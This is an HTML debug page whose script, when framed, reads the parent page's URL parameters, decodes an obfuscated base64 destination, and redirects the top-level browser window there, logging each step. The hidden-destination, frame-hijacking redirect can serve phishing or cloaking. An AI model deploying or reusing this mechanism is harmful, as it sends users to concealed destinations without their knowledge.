<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>NS Debug</title>
<style>
  body { font-family: monospace; font-size: 14px; padding: 10px; background: #111; color: #0f0; }
  .err { color: #f66; }
  .warn { color: #ff6; }
</style>
<pre id="log">[NS] Starting diagnostic log...\n</pre>

<script>
(function(){
  const logEl = document.getElementById("log");
  const log = (msg, cls="") => {
    const span = document.createElement("div");
    if (cls) span.className = cls;
    span.textContent = msg;
    logEl.appendChild(span);
    console.log(msg);
  };

  log("[NS] Script loaded and running.");
  let parentURL = "";
  let srcDetected = false;

  try {
    log("[NS] Trying window.top.location.href...");
    parentURL = window.top?.location?.href || "";
    if (parentURL) {
      log("[NS] Got top location: " + parentURL);
      srcDetected = true;
    } else {
      log("[NS] window.top.location empty or blocked.", "warn");
    }
  } catch(e) {
    log("[NS] Error accessing top location: " + e, "err");
  }

  try {
    if (!parentURL && document.referrer) {
      log("[NS] Trying document.referrer...");
      parentURL = document.referrer;
      if (parentURL) {
        log("[NS] Got referrer: " + parentURL);
        srcDetected = true;
      }
    } else if (!document.referrer) {
      log("[NS] No referrer detected.", "warn");
    }
  } catch(e) {
    log("[NS] Error reading referrer: " + e, "err");
  }

  if (!srcDetected) {
    log("[NS] ❌ Could not get parent URL. Aborting redirect.", "err");
    return;
  }

  function dec(s){
    try {
      const map = {
        "https://":"h~","http://":"p~","www.":"w~",
        ".com":".c",".org":".o",".net":".n"
      };
      let u = atob(s.replace(/-/g,"+").replace(/_/g,"/"));
      for (const [k,v] of Object.entries(map)) u = u.replaceAll(v,k);
      if (!/^https?:\/\//.test(u)) u = "https://" + u;
      return u;
    } catch(e) {
      log("[NS] Base64 decode failed: " + e, "err");
      return null;
    }
  }

  let urlToGo = "";
  try {
    log("[NS] Parsing params from parent URL...");
    const params = new URL(parentURL).searchParams;
    const c = params.get("c");
    const i = params.get("i");
    log("[NS] Params found: c=" + c + " | i=" + i);

    if (i) {
      const rel = decodeURIComponent(i);
      const base = new URL(parentURL).origin;
      urlToGo = rel.startsWith("/") ? base + rel :
        (rel === "/" ? base : base + "/" + rel);
      log("[NS] Internal redirect target: " + urlToGo);
    } 
    else if (c) {
      urlToGo = dec(c);
      log("[NS] External redirect target: " + urlToGo);
    } 
    else {
      log("[NS] ⚠️ No redirect parameters found.", "warn");
      return;
    }
  } catch(e) {
    log("[NS] Error while parsing params: " + e, "err");
    return;
  }

  if (!urlToGo) {
    log("[NS] ❌ No valid redirect target found. Abort.", "err");
    return;
  }

  try {
    log("[NS] Attempting redirect using window.top.location.replace...");
    window.top.location.replace(urlToGo);
    log("[NS] Redirect command issued.");
  } catch(e) {
    log("[NS] window.top.location.replace failed: " + e, "err");
    try {
      log("[NS] Trying window.top.location.href...");
      window.top.location.href = urlToGo;
      log("[NS] Fallback redirect command issued.");
    } catch(e2) {
      log("[NS] Both redirect attempts failed: " + e2, "err");
    }
  }
})();
</script>
</html>
